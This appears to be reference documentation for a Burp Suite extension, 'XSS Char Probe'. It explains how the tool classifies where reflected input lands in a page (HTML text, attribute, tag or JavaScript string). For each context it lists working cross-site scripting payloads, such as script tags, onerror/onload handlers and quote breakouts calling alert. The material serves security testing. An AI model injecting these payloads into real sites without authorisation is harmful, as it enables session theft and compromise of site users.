# Injection Context Reference

When XSS Char Probe detects reflected characters it also reports the
**context** -- where in the HTML/JS the value landed. The context
determines what characters you need and what payload to use.

---

## html_text

The value is reflected inside a normal HTML text node.

```html
<p>Hello xssP"><'`</p>
```

**Characters needed:** `<` and `>`
**What you can do:** Inject full HTML tags including `<script>`

```
Payload: <script>alert(document.domain)</script>
         <img src=x onerror=alert(1)>
         <svg onload=alert(1)>
```

---

## html_attr

The value is reflected inside an HTML attribute value.

```html
<input value="xssP"><'`">
<a href='xssP"><'`'>
```

**Characters needed:** `"` (double-quoted attr) or `'` (single-quoted attr)
**What you can do:** Close the attribute and inject an event handler

```
Payload (double quote): " onmouseover="alert(1)" x="
Payload (single quote): ' onmouseover='alert(1)' x='
Payload (unquoted):     x onmouseover=alert(1) y=
```

---

## html_tag

The value is reflected inside an HTML tag but not inside an attribute value.

```html
<input xssP"><'` type="text">
```

**Characters needed:** `>` to close the tag, or space to add attributes
**What you can do:** Inject new attributes directly

```
Payload: onmouseover=alert(1) x=
         autofocus onfocus=alert(1) x=
```

---

## js_string

The value is reflected inside a JavaScript string literal.

```html
<script>
  var name = "xssP"><'`";
  var city = 'xssP"><'`';
</script>
```

**Characters needed:** `"` or `'` matching the string delimiter
**Note:** You do NOT need `<` or `>` here

```
Payload (double quote): ";alert(document.domain)//
Payload (single quote): ';alert(document.domain)//
Payload (template lit): `${alert(1)}`
```

---

## unknown

Context could not be determined automatically.

**Action:** Open the request in Burp Repeater, send the probe manually,
and inspect the raw response to find where the value landed.

---

## Context Detection Heuristic

The extension looks at up to 200 characters **before** the probe position:

| Pattern found before probe | Detected context |
|---------------------------|-----------------|
| `var x = "` or `let x = '` | js_string |
| `= "...` or `= '...` (unclosed) | js_string |
| `<tag attr="` (open tag, attribute) | html_attr |
| `<tag ` (open tag, no closing `>`) | html_tag |
| `>` found before probe | html_text |
| None of the above | unknown |

This is a heuristic -- always verify manually before building a payload.
